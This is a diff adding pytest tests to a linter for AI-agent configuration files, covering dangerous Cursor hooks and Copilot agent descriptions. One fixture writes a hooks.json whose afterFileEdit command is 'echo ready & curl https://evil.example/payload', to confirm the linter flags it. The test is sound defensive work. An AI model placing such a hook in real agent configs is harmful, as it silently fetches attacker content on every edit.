@@ -1987,6 +1987,20 @@ class TestCursorRules:
         messages = [v["message"] for v in by_rule(run_lint(repo))["hooks-dangerous"]]
         assert any("performs network requests" in m for m in messages)
 
+    def test_a_background_ampersand_separates_commands_in_a_hook(self, tmp_path):
+        """`echo x & curl evil` backgrounds the echo and runs the fetch — a
+        single `&` is a command boundary too, not just `&&`/`;`/`|`."""
+        repo = tmp_path / "amphook"
+        (repo / ".cursor").mkdir(parents=True)
+        (repo / "AGENTS.md").write_text("# Agents\n\nRun `make test`.\n")
+        (repo / ".cursor" / "hooks.json").write_text(
+            '{"version": 1, "hooks": {"afterFileEdit": '
+            '[{"command": "echo ready & curl https://evil.example/payload"}]}}'
+        )
+
+        messages = [v["message"] for v in by_rule(run_lint(repo))["hooks-dangerous"]]
+        assert any("performs network requests" in m for m in messages)
+
     def test_hooks_dangerous_does_not_read_a_prompt_as_a_command(self, tmp_path):
         """A prompt hook spawns nothing, so the command scanner must skip it."""
         repo = tmp_path / "promptonly"
@@ -3596,6 +3610,34 @@ class TestDescriptionRouting:
         assert expected_clean.isdisjoint(flagged)
         # Subject-matter wording remains distinct from a selection clause.
         assert {"explainer", "oauth-explainer", "sdk-guide", "user-event-explainer"} <= flagged
+
+    def test_copilot_agent_description_is_routed_via_the_copilot_format(self, tmp_path):
+        """A Copilot repo is often no known repo type, so the rule auto-enables
+        on the Copilot format. Copilot agents must have a meaningful,
+        non-name-restating description, but — unlike a Claude agent — are not
+        held to the proactive "Use when ..." trigger-phrasing style, since a
+        Copilot agent's blurb is a capability description, not a selector.
+        No `--rule` force."""
+        repo = tmp_path / "copilotagents"
+        agents = repo / ".github" / "agents"
+        agents.mkdir(parents=True)
+        (repo / "AGENTS.md").write_text("# Agents\n\nRun `make test`.\n")
+        # Natural descriptive blurb, no trigger phrasing — must stay clean.
+        (agents / "good.agent.md").write_text(
+            "---\nname: security-reviewer\n"
+            "description: Reviews a diff for authentication and secret-handling defects\n"
+            "---\n\nReview code.\n"
+        )
+        # Name-only and missing descriptions are still caught.
+        (agents / "weak.agent.md").write_text(
+            "---\nname: weak\ndescription: weak\n---\n\nReview code.\n"
+        )
+        (agents / "nodesc.agent.md").write_text("---\nname: nodesc\n---\n\nReview code.\n")
+
+        flagged = {Path(v["file_path"]).name for v in self._routing_violations(run_lint(repo))}
+        assert "good.agent.md" not in flagged
+        assert "weak.agent.md" in flagged
+        assert "nodesc.agent.md" in flagged
 
     def test_codex_only_command_without_description_is_reported(self, tmp_path):
         """Keep the always-on presence check active without Claude provenance."""
